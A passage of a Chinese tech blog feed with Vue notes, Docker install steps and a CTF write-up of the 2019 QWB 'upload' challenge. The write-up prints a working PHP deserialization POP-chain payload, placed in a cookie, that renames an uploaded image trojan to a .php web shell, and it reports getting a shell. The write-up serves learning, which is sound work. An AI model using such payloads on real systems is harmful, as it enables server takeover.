class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//可以</span></span><br><span class="line">&#123;&#123; number + <span class="number">1</span> &#125;&#125;</span><br><span class="line">&#123;&#123; ok ? <span class="string">&#x27;YES&#x27;</span> : <span class="string">&#x27;NO&#x27;</span> &#125;&#125;</span><br><span class="line">&#123;&#123; message.split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>) &#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//不可以</span></span><br><span class="line">&#123;&#123; <span class="keyword">var</span> a = <span class="number">1</span> &#125;&#125;</span><br><span class="line">&#123;&#123; <span class="keyword">if</span> (ok) &#123; <span class="keyword">return</span> message &#125; &#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="vue-cli"><a href="#vue-cli" class="headerlink" title="vue-cli"></a>vue-cli</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装</span></span><br><span class="line">npm i -g @vue-cli</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建项目</span></span><br><span class="line">vue create my-project</span><br></pre></td></tr></table></figure><p>工程结构</p><ul><li>node_modules：项目依赖的第三方库</li><li>public</li><li>src：自己写的代码<ul><li>main.js：入口文件</li><li>assets：存放静态文件，img等</li></ul></li></ul><p>运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 打包生成</span></span><br><span class="line">npm run build</span><br><span class="line"><span class="meta">#</span><span class="bash"> 运行</span></span><br><span class="line">npm run serve</span><br></pre></td></tr></table></figure><h2 id="element-ui"><a href="#element-ui" class="headerlink" title="element-ui"></a>element-ui</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装</span></span><br><span class="line">npm i element-ui -S</span><br></pre></td></tr></table></figure><p>引入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 完整引入 main.js中</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ElementUI <span class="keyword">from</span> <span class="string">&#x27;element-ui&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;element-ui/lib/theme-chalk/index.css&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Vue.use(ElementUI);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 局部引入 main.js中</span><br><span class="line"><span class="keyword">import</span> &#123; Button, Select &#125; <span class="keyword">from</span> <span class="string">&#x27;element-ui&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Vue.component(Button.name, Button);</span><br><span class="line">Vue.component(Select.name, Select);</span><br></pre></td></tr></table></figure><h2 id="router"><a href="#router" class="headerlink" title="router"></a>router</h2><ul><li>基本格式</li></ul><p>路由文件中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> VueRouter <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.use(VueRouter)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> routes = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">     routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure><ul><li>一些特性</li><li>router.push()</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.$router.push(<span class="string">&#x27;home&#x27;</span>) <span class="comment">//跳转到指定路径</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> userId = <span class="string">&#x27;123&#x27;</span></span><br><span class="line"></span><br><span class="line">router.push(&#123; <span class="attr">name</span>: <span class="string">&#x27;user&#x27;</span>, <span class="attr">params</span>: &#123; userId &#125;&#125;) <span class="comment">// -&gt; /user/123</span></span><br><span class="line">router.push(&#123; <span class="attr">path</span>: <span class="string">`/user/<span class="subst">$&#123;userId&#125;</span>`</span> &#125;) <span class="comment">// -&gt; /user/123</span></span><br><span class="line"><span class="comment">// 这里的 params 不生效</span></span><br><span class="line">router.push(&#123; <span class="attr">path</span>: <span class="string">&#x27;/user&#x27;</span>, <span class="attr">params</span>: &#123; userId &#125;&#125;) <span class="comment">// -&gt; /user</span></span><br></pre></td></tr></table></figure><ul><li>router.go(n)：在history模式中前进或后退，相当于forward和back</li></ul><h3 id="导航守卫"><a href="#导航守卫" class="headerlink" title="导航守卫"></a>导航守卫</h3><p>判断是否有权限访问相关页面</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">router.beforeEach(<span class="function">(<span class="params">to,<span class="keyword">from</span>,next</span>) =&gt;</span>&#123;</span><br><span class="line">  <span class="comment">//to将要访问的路径</span></span><br><span class="line">  <span class="comment">//from代表从哪个页面访问的</span></span><br><span class="line">  <span class="comment">//next 是一个函数，表示放行，即送到to的地址</span></span><br><span class="line">  <span class="keyword">if</span> (to.path === <span class="string">&quot;/login&quot;</span>) <span class="keyword">return</span> next();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//获取token</span></span><br><span class="line">  <span class="keyword">const</span> tokenStr = <span class="built_in">window</span>.sessionStorage.getItem(<span class="string">&#x27;token&#x27;</span>);</span><br><span class="line">  <span class="comment">//如果token为空，则送到登录界面</span></span><br><span class="line">  <span class="keyword">if</span>(!tokenStr) <span class="keyword">return</span> next(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">  <span class="comment">//若不为空，则送到to</span></span><br><span class="line">  next()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;…..&lt;/p&gt;</summary>
    
    
    
    
    <category term="vue" scheme="http://example.com/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>强网杯2019-upload</title>
    <link href="http://example.com/2020/01/23/%E5%BC%BA%E7%BD%91%E6%9D%AF2019%20upload%20%E5%A4%8D%E7%8E%B0WP/"/>
    <id>http://example.com/2020/01/23/%E5%BC%BA%E7%BD%91%E6%9D%AF2019%20upload%20%E5%A4%8D%E7%8E%B0WP/</id>
    <published>2020-01-22T16:00:00.000Z</published>
    <updated>2021-10-25T05:15:42.100Z</updated>
    
    <content type="html"><![CDATA[<p>强网杯2019 upload 复现WP</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>整体review一遍，注册登录走一遍，另外发现可以上传文件，直接提交php后缀会提示forbidden，传图片木马，抓包修改上传也无法利用。</p><p>发现cookie是一串base64的加密字符串，解密后是一串序列化字符串.</p><span id="more"></span><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619153141870.png" alt="image-20200619153141870"></p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619153316777.png" alt="image-20200619153316777"></p><p>首先想到的是反序列化，但是反序列化一般都需要源码，所以试了<a href="http://www.zip和www.tar.gz,下载了源码./">www.zip和www.tar.gz，下载了源码。</a></p><p>全局搜索unserilize函数和serialize函数，发现分别在profile.php和index.php中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php   unserialize()  //对cookie进行反序列化操作 </span><br><span class="line">profile.php  serialize()</span><br></pre></td></tr></table></figure><p>全局搜索魔法函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__desstruct()  Register.php -&gt; class Register</span><br><span class="line">__call()   profile.php -&gt; class profile</span><br><span class="line">__get()    profile.php -&gt; class profile</span><br></pre></td></tr></table></figure><p>梳理一下这几个魔法函数在php反序列化中的作用</p><ul><li>__destruct()：调用unserialize()函数时会自动触发这个函数</li><li>__call()：当被调用的方法不在此类中时，会触发这个函数</li><li>__get()：当调用的属性不在此类中时，将触发这个方法</li></ul><p>分别列举出这几个函数看一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Register.php</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>会调用check中的index方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">profile.php    </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[<span class="variable">$name</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;&#125;(<span class="variable">$arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>结合题目场景，用文件上传一个木马，然后菜刀连接getshell获取flag，但是上传的图片木马会被改名，另外梳理一下源代码逻辑，找一下文件操作代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">profile.php</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect(<span class="variable">$curr_url</span>,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Forbidden type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Unknow file type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>梳理一下这段代码的作用</p><ul><li><p>1.检查是否登录 。<strong>this-&gt;checker=0时则不进入此判断。</strong></p></li><li><p>2.检查流量包中是否存在$_FILE，存在则会进入ext_check()进行判断，看一下etc_check()的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ext_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span>=explode(<span class="string">&quot;.&quot;</span>,<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;ext=end(<span class="variable">$ext_arr</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext==<span class="string">&quot;png&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现这段代码就是判断文件是否为png文件，我们需要绕过这个判断，由文件上传的知识可以知道，当用GET方式上传文件时，$_FILE这个全局变量是为空的，所以<strong>这里可以用GET访问绕过</strong></p></li><li><p>如果ext为1，则进行相应的文件操作在后面的构造中，<strong>将ext设为1即可</strong>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename); <span class="comment">//复制文件</span></span><br><span class="line">@unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br></pre></td></tr></table></figure></li></ul><p>关键操作在第3点：用copy函数，将filename_tmp的值覆盖原来的文件名，这里就是我们最终想要操作的地方，由前面可知，我们上传的木马被改名且不可用，我们的突破点是<strong>将被改了名的文件改成我们希望的文件名</strong>。所以，终极目标是：<strong>触发profile中的img_upload()方法，且绕过进入文件操作前面的那些判断。</strong></p><p>首先明确这个操作在profile类中</p><ul><li>第一，我们的序列号字符串中需要一个profile类来通过一些手段来触发这个函数。</li><li>第二，如何才能触发这个类中的方法？关注_ <em>call()、 _ _get() 、</em> destruct()这三个函数</li></ul><p>首先看__destruct()函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Register.php</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>会调用checker中的index方法，那么我们怎么才能利用这个函数来呢？首先是解决如何触发profile中的魔术方法</p><p>再看__call()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;&#125;(<span class="variable">$arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码意思为，当所调用的方法不存在时，会进行下面的操作，结合destruct中的代码，如果我们的checker当时序列化的是profile，在destruct的时候，会调用index()方法，但是这个方法在profile中是不存在的，所以触发call方法，到了call方法后，注意这里：$this-&gt;{$this-&gt;$name}()，此时，$name为之前传入的index，这里$this-&gt;$name变为了调用属性。当调用类中不存在的属性名时，会触发__get()方法，看看代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[<span class="variable">$name</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>会返回except[$name]的值，注意！我们的终极目标是触发img_upload()函数！这里就是突破点，如果我们把except赋值为：$except[index=&gt;’upload_img’]的话，那get函数返回的值为upload_img，在call函数中，就变成了 $this -&gt; upload_img()，就成功触发了upload_img函数。</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>下面我们来梳理一下payload。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//绕过登录判断</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>=<span class="string">&quot;../public/upload/1.png&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;../public/upload/fxxy.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_menu</span>;</span><br><span class="line">    <span class="comment">//绕过文件后缀名判断</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img</span>;</span><br><span class="line">    <span class="comment">//触发upload_img()</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span>=<span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$registed</span>=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Register();</span><br><span class="line"><span class="variable">$a</span>-&gt;checker=<span class="keyword">new</span> Profile();</span><br><span class="line"><span class="variable">$a</span>-&gt;checker-&gt;checker = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// echo serialize($a);</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后用生成的payload替换我们的cookie</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619160639987.png" alt="image-20200619160639987"></p><p>可以看到文件名已经改了</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619162026455.png" alt="image-20200619162026455"></p><p>蚁🗡连接，getshell。</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200619161957182.png" alt="image-20200619161957182"></p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li>对于POP链的构造加深了理解，找到反序列化点后，一般先全局搜索相关的魔法函数，看这些函数能否通过相关的手段串联起来达到我们最终的目的</li><li>PHP的namespace理解。<a href="https://www.runoob.com/w3cnote/php-namespace-intro.html">https://www.runoob.com/w3cnote/php-namespace-intro.html</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;强网杯2019 upload 复现WP&lt;/p&gt;
&lt;h2 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h2&gt;&lt;p&gt;整体review一遍，注册登录走一遍，另外发现可以上传文件，直接提交php后缀会提示forbidden，传图片木马，抓包修改上传也无法利用。&lt;/p&gt;
&lt;p&gt;发现cookie是一串base64的加密字符串，解密后是一串序列化字符串.&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>docker学习笔记</title>
    <link href="http://example.com/2019/10/30/docker%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2019/10/30/docker%E7%AC%94%E8%AE%B0/</id>
    <published>2019-10-29T16:00:00.000Z</published>
    <updated>2021-10-25T05:11:35.301Z</updated>
    
    <content type="html"><![CDATA[<p>为什么要学docker？因为搭环境太累了！！</p><span id="more"></span><p>首先明确docker是什么：</p><ul><li>是一个用于开发，交付和运行应用程序的开放平台。Docker 使您能够将应用程序与基础架构分开，从而可以快速交付软件。</li><li>说白了，就是一个集成环境，里面包含你需要的应用和相应配置</li></ul><p>优点：</p><ul><li>快速，一致地交付您的应用程序。</li><li>响应式部署和扩展。Docker 是基于容器的平台，允许高度可移植的工作负载。Docker 容器可以在开发人员的本机上，数据中心的物理或虚拟机上，云服务上或混合环境中运行。<ul><li>也就是说，随时随地轻松启动。</li></ul></li><li>在同一硬件上运行更多工作负载。Docker 轻巧快速。它为基于虚拟机管理程序的虚拟机提供了可行、经济、高效的替代方案，因此您可以利用更多的计算能力来实现业务目标。<ul><li>翻译成白话就是：轻量、内存消耗较小</li></ul></li></ul><p><strong>本文以安装redis环境为例</strong></p><h2 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h2><p>环境</p><ul><li>Ubuntu：18.04.2</li></ul><h3 id="先把源更新为阿里源"><a href="#先把源更新为阿里源" class="headerlink" title="先把源更新为阿里源"></a>先把源更新为阿里源</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vim /etc/apt/sources.list</span></span><br></pre></td></tr></table></figure><p>将文件中的内容全部注释掉，新增以下内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable</span><br><span class="line"><span class="meta">#</span><span class="bash"> deb-src [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable</span></span><br><span class="line">deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic stable</span><br><span class="line"><span class="meta">#</span><span class="bash"> deb-src [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic stable</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> deb-src [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic stable</span></span><br></pre></td></tr></table></figure><p>多说一个坑，如果上述注释的内容没有注释的话，会报错</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200621124333682.png" alt="image-20200621124333682"></p><p>意思就是这个源没有了，但是可能就会陷入一个误区，这个源没有了，那我的软件就装不了了，其实不是，这只是一个源除了问题，将这个出错的源remove后，其余的源会自动再次帮我们寻找我们想要的软件，命令如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository --remove aliyun:/docker-engine/apt/repo</span><br></pre></td></tr></table></figure><p>相关remove后面的参数，根据自己的报错信息更改，我的是：<code>http://mirrors.aliyun.com/docker-engine/apt/repo</code>，按照相应格式进行替换：<code>源名:出错仓库</code></p><h3 id="安装证书"><a href="#安装证书" class="headerlink" title="安装证书"></a>安装证书</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></table></figure><h3 id="安装docker官方公钥"><a href="#安装docker官方公钥" class="headerlink" title="安装docker官方公钥"></a>安装docker官方公钥</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 